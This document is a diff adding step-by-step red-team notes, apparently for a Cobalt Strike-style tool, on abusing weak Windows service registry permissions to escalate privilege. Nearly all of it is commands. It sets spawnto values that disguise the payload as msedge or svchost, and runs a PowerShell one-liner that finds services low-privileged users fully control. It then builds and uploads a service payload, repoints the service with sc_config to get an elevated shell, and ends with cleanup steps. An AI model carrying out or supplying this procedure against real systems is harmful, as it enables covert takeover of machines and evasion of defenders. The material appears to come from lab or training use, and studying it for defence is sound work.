@@ -1,1 +1,20 @@
 example abusing weak registry permissions for services...
+  update the spawnto to msedge:
+    spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+  run this powershell script to find services where low-priv users have full control rights:
+    powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}
+  update the spawnto for the service binary payloads:
+    ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+  generate a windows stageless payload saved as a windows service exe
+  stop the target service:
+    sc_stop BadWindowsService
+  upload the new payload to C:\Temp
+  grab the current service path (e.g. sc_qc BadWindowsService)
+  reconfigure to point to our payload:
+    sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
+  restart the service, we should now get an elevated shell!
+
+cleanup:
+  restore the service to its original path
+  delete the payload from C:\Temp
+  restart the service
